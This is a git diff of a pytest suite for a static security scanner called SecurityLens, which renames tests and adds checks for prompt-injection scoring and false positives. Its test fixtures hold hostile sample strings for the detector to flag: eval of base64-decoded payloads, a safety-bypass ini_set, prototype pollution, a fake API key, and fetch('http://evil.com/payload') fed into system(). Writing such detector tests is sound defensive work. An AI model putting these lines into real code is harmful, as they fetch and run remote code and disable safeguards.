@@ -1,8 +1,8 @@
 import pytest
 import os
-from gitgalaxy.security.security_lens import SecurityLens
 import base64
 from unittest.mock import patch
+from gitgalaxy.security.security_lens import SecurityLens
 
 
 @pytest.fixture
@@ -12,25 +12,25 @@ def lens():
 
 
 # ==============================================================================
-# TEST 1: THREAT SIGNATURES & REGEX EXTRACTORS
+# TEST 1: VULNERABILITY SIGNATURES & REGEX EXTRACTORS
 # ==============================================================================
-def test_security_lens_threat_signatures(lens):
+def test_sast_vulnerability_signatures(lens):
     """
-    Proves the engine detects specific logic bombs, shadow imports, environment
-    poisoning, and credential leaks using its internal regex rules.
+    Proves the engine detects specific logic bombs, steganographic imports, prototype
+    pollution, and credential leaks using its internal regex rules.
     """
     malicious_code = (
-        "// 1. Vault Door (Private Info)\n"
+        "// 1. Hardcoded Secrets (Private Info)\n"
         "api_key = 'A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6'\n"
         "\n"
-        "// 2. Executioner & Trojan (Danger & Safety Neg)\n"
+        "// 2. Dynamic Code Execution & Safety Bypasses (Danger & Safety Neg)\n"
         "ini_set('disable_functions', 0);\n"
         "eval(base64_decode(payload));\n"
         "\n"
-        "// 3. Shadow Imports (Steganography)\n"
+        "// 3. Steganographic Imports (Shadow Imports)\n"
         "require('hidden_payload.png');\n"
         "\n"
-        "// 4. Environment Poisoning (Flux)\n"
+        "// 4. Prototype Pollution (Flux)\n"
         "Object.__proto__ = { polluted: true };\n"
     )
 
@@ -39,7 +39,7 @@ def test_security_lens_threat_signatures(lens):
 
     assert counts.get("private_info", 0) > 0, "Failed to detect high-entropy API key!"
     assert counts.get("safety_neg", 0) > 0, "Failed to detect safety bypass (ini_set)!"
-    assert counts.get("danger", 0) > 0, "Failed to detect executioner payload (eval)!"
+    assert counts.get("danger", 0) > 0, "Failed to detect dynamic execution payload (eval)!"
     assert counts.get("shadow_imports", 0) > 0, (
         "Failed to detect steganographic import!"
     )
@@ -47,14 +47,14 @@ def test_security_lens_threat_signatures(lens):
 
 
 # ==============================================================================
-# TEST 2: SHANNON ENTROPY & GLASSWORM OBFUSCATION
+# TEST 2: SHANNON ENTROPY & OBFUSCATION DETECTION
 # ==============================================================================
-def test_security_lens_shannon_entropy(lens):
+def test_obfuscation_entropy_detection(lens):
     """
     Proves the string extractor drops small strings but accurately calculates
     Shannon Entropy on large, highly randomized base64/hex blocks.
     """
-    # A highly random string wrapped in quotes (length > 64 to bypass the C-engine shield)
+    # A highly random string wrapped in quotes (length > 64 to bypass the ReDoS shield)
     high_entropy_str = (
         "x" + base64.b64encode(os.urandom(100)).decode("utf-8") + "y8f!@#$A9Z"
     )
@@ -69,20 +69,20 @@ def test_security_lens_shannon_entropy(lens):
 
 
 # ==============================================================================
-# TEST 3: N-DIMENSIONAL TAINT ANALYSIS (The LHS Slicer)
+# TEST 3: DATA FLOW TAINT TRACKING (Left-Hand Side Assignment)
 # ==============================================================================
-def test_security_lens_taint_slicer(lens):
+def test_data_flow_taint_tracking(lens):
     """
     Proves the engine can track multi-line taint from I/O sinks to execution
     sinks (RCE), and from LLM Hooks to RCE (Agentic RCE).
     """
     code = (
         "// Scenario A: Standard Tainted Injection (Multi-line)\n"
-        "let user_input = fetch('[http://evil.com/payload](http://evil.com/payload)');\n"
+        "let user_input = fetch('http://evil.com/payload');\n"
         "system(user_input);\n"
         "\n"
         "// Scenario B: Same-line Prompt Injection\n"
-        "invoke(fetch('[http://api.com](http://api.com)'));\n"
+        "invoke(fetch('http://api.com'));\n"
         "\n"
         "// Scenario C: Agentic RCE (LLM output fed to execution)\n"
         "ai_response = openai.chat.completions.create(prompt);\n"
@@ -110,7 +110,7 @@ def test_security_lens_taint_slicer(lens):
 # ==============================================================================
 # TEST 4: THE AUTO-GEN SHIELD
 # ==============================================================================
-def test_security_lens_auto_gen_shield(lens):
+def test_auto_gen_shield_bypasses(lens):
     """
     Proves that machine generated code bypasses taint tracking and homoglyph
     searches to save CPU cycles and prevent false positives.
@@ -131,17 +131,17 @@ def test_security_lens_auto_gen_shield(lens):
         "Auto-gen shield failed to block homoglyph scan!"
     )
     assert counts.get("tainted_injection", 0) == 0, (
-        "Auto-gen shield failed to block Taint Slicer!"
+        "Auto-gen shield failed to block Taint Tracking!"
     )
 
 
 # ==============================================================================
-# TEST 5: EVALUATE RISK & NETWORK GRAVITY
+# TEST 5: EVALUATE RISK & NETWORK CENTRALITY AMPLIFICATION
 # ==============================================================================
-def test_security_lens_evaluate_risk(lens):
+def test_evaluate_risk_network_centrality(lens):
     """
-    Proves the Network Gravity multiplier correctly amplifies threshold policies
-    for highly central 'God Nodes' in the graph.
+    Proves the Network Centrality multiplier correctly amplifies threshold policies
+    for highly central architecture nodes in the dependency graph.
     """
     hits = {
         "danger": 50,
@@ -152,21 +152,38 @@ def test_security_lens_evaluate_risk(lens):
     # 1. Standard File
     standard_risk = lens.evaluate_risk(hits, loc, network_metrics=None)
 
-    # 2. Central 'God Node' (Blast Radius > 1.0)
+    # 2. Central Architecture Node (Blast Radius > 1.0)
     network_data = {"normalized_blast_radius": 2.0, "betweenness_score": 0.1}
     amplified_risk = lens.evaluate_risk(hits, loc, network_metrics=network_data)
 
     assert "Data Injection Risk" in standard_risk
     assert "Data Injection Risk" in amplified_risk
 
-    # The amplified risk density should be drastically higher due to network gravity
+    # The amplified risk density should be drastically higher due to network centrality
     assert amplified_risk["Data Injection Risk"] > standard_risk["Data Injection Risk"]
 
 
+def test_evaluate_risk_prompt_injection_isolation(lens):
+    """
+    Proves that Prompt Injections that do NOT result in RCE are scored independently,
+    without triggering the Critical RCE override.
+    """
+    hits = {
+        "prompt_injection": 5,
+        "agentic_rce": 0,
+    }
+    loc = 100
+
+    risk = lens.evaluate_risk(hits, loc, network_metrics=None)
+
+    assert "Prompt Injection Risk" in risk
+    assert "Agentic RCE Risk (Critical)" not in risk
+
+
 # ==============================================================================
-# TEST 6: BINARY X-RAY SCANNER
+# TEST 6: BINARY MAGIC BYTE & ENTROPY SCANNER
 # ==============================================================================
-def test_security_lens_scan_binary(lens):
+def test_binary_magic_byte_scanner(lens):
     """
     Proves the X-Ray scanner detects Magic Byte mismatches, embedded execution
     headers (ELF/MZ), and extreme binary entropy.
@@ -192,9 +209,9 @@ def test_security_lens_scan_binary(lens):
 
 
 # ==============================================================================
-# TEST 7: THE GOD MODE OVERRIDE (100% COVERAGE SWEEP)
+# TEST 7: COMPREHENSIVE COVERAGE & SAFE FALLBACKS
 # ==============================================================================
-def test_security_lens_god_mode_coverage_sweep(lens):
+def test_comprehensive_risk_evaluation_coverage(lens):
     """
     Triggers every remaining catastrophic threshold, empty state fallback,
     and exception handler to achieve 100% branch coverage.
@@ -202,7 +219,12 @@ def test_security_lens_god_mode_coverage_sweep(lens):
     # 1. Empty Entropy Fallback
     assert lens._calculate_shannon_entropy("") == 0.0
 
-    # 2. Total Threshold Breach (Triggering every risk vector simultaneously)
+    # 2. Safe Code Baseline (Zero False Positives)
+    safe_hits = {"branch": 5, "linear": 10}
+    safe_risk = lens.evaluate_risk(safe_hits, 100)
+    assert not safe_risk, "Safe code generated false positive risk exposures!"
+
+    # 3. Total Threshold Breach (Triggering every risk vector simultaneously)
     apocalyptic_hits = {
         "heat_triggers": 500,  # Hidden Malware
         "graveyard": 500,  # Logic Bomb
@@ -221,7 +243,7 @@ def test_security_lens_god_mode_coverage_sweep(lens):
     assert "Secrets Leak Risk" in doomsday_risk
     assert "Agentic RCE Risk (Critical)" in doomsday_risk
 
-    # 3. Binary Scanner Exception Handler
+    # 4. Binary Scanner Exception Handler
     # We pass a valid byte array to survive the header scan, but mock the Counter
     # to throw an exception, proving the except block safely swallows it.
     with patch(
